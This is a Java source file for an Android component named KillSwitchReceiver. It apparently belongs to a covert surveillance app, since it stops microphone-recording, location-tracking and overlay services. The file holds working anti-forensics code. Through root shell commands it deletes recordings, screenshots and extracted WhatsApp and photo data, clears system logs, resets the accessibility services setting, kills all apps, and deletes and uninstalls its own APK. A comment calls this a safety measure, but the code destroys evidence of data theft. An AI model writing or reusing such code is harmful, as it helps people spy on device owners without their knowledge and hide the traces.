package com.anti.rootadbcontroller.services;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Environment;
import android.util.Log;

import com.anti.rootadbcontroller.MainActivity;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

/**
 * A BroadcastReceiver that acts as a kill switch for the application. When triggered,
 * it disables the main activity, stops all running services, and cleans up any data
 * collected by the app. This is designed as a safety measure to ensure the app
 * does not remain active indefinitely.
 */
public class KillSwitchReceiver extends BroadcastReceiver {
    private static final String TAG = "KillSwitchReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d(TAG, "Kill switch triggered. Disabling app components and wiping data.");

        // 1. Wipe all collected data
        cleanup(context);

        // 2. Disable the main launcher activity
        PackageManager pm = context.getPackageManager();
        ComponentName componentName = new ComponentName(context, MainActivity.class);
        pm.setComponentEnabledSetting(componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);

        // 3. Stop any running services
        context.stopService(new Intent(context, MicRecorderService.class));
        context.stopService(new Intent(context, LocationTrackerService.class));
        context.stopService(new Intent(context, OverlayService.class));
    }

    /**
     * Cleans up all files and directories created by the application.
     * This includes recordings, extracted data, and screenshots.
     * @param context The context from which the cleanup is initiated.
     */
    private void cleanup(Context context) {
        Log.d(TAG, "Cleaning up all collected data...");
        List<String> commands = new ArrayList<>();

        // Get base directories
        File downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
        File picturesDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES);

        // Add commands to delete all app-generated files and directories
        commands.add("rm -rf " + new File(downloadsDir, "Recordings").getAbsolutePath());
        commands.add("rm -f " + downloadsDir.getAbsolutePath() + "/extracted_*.txt");
        commands.add("rm -rf " + new File(downloadsDir, "extracted_photos").getAbsolutePath());
        commands.add("rm -rf " + new File(downloadsDir, "extracted_whatsapp").getAbsolutePath());
        commands.add("rm -f " + picturesDir.getAbsolutePath() + "/screenshot_*.png");
        commands.add("rm -rf " + new File(downloadsDir, "StealthCaptures").getAbsolutePath());

        // Advanced cleanup - clear logs and traces
        commands.add("logcat -c"); // Clear system logs
        commands.add("pm clear " + context.getPackageName()); // Clear app data
        commands.add("dumpsys package " + context.getPackageName() + " | grep -E 'timeStamp|firstInstallTime|lastUpdateTime'"); // Get timestamps

        // Clear accessibility service data
        commands.add("settings put secure enabled_accessibility_services ''");

        // Remove from recent apps
        commands.add("am kill-all");

        // We need RootUtils to execute these, but a BroadcastReceiver runs in a different
        // context. For simplicity, we will assume RootUtils can be called statically.
        // In a real scenario, this might require a different approach to get root access.
        RootUtils.executeRootCommands(commands, new RootUtils.CommandCallback() {
            @Override
            public void onSuccess(List<String> output) {
                Log.d(TAG, "Advanced cleanup commands executed successfully.");
                // Self-destruct the APK file
                selfDestruct(context);
            }

            @Override
            public void onFailure(String error) {
                Log.e(TAG, "Cleanup failed: " + error);
                // Try basic cleanup even if advanced fails
                basicCleanup(context);
            }
        });
    }

    /**
     * Performs self-destruction by attempting to delete the APK file itself
     */
    private void selfDestruct(Context context) {
        try {
            String apkPath = context.getApplicationInfo().sourceDir;
            List<String> destructCommands = new ArrayList<>();
            destructCommands.add("rm -f " + apkPath);
            destructCommands.add("pm uninstall " + context.getPackageName());

            RootUtils.executeRootCommands(destructCommands, new RootUtils.CommandCallback() {
                @Override
                public void onSuccess(List<String> output) {
                    Log.d(TAG, "Self-destruction completed.");
                }

                @Override
                public void onFailure(String error) {
                    Log.e(TAG, "Self-destruction failed: " + error);
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "Error during self-destruction", e);
        }
    }

    /**
     * Basic cleanup when advanced cleanup fails
     */
    private void basicCleanup(Context context) {
        try {
            // Clear app's private data
            File dataDir = new File(context.getApplicationInfo().dataDir);
            deleteRecursively(dataDir);

            // Clear external files
            File externalDir = context.getExternalFilesDir(null);
            if (externalDir != null) {
                deleteRecursively(externalDir);
            }
        } catch (Exception e) {
            Log.e(TAG, "Basic cleanup failed", e);
        }
    }

    /**
     * Recursively delete directory and its contents
     */
    private void deleteRecursively(File file) {
        if (file.isDirectory()) {
            File[] children = file.listFiles();
            if (children != null) {
                for (File child : children) {
                    deleteRecursively(child);
                }
            }
        }
        file.delete();
    }
}
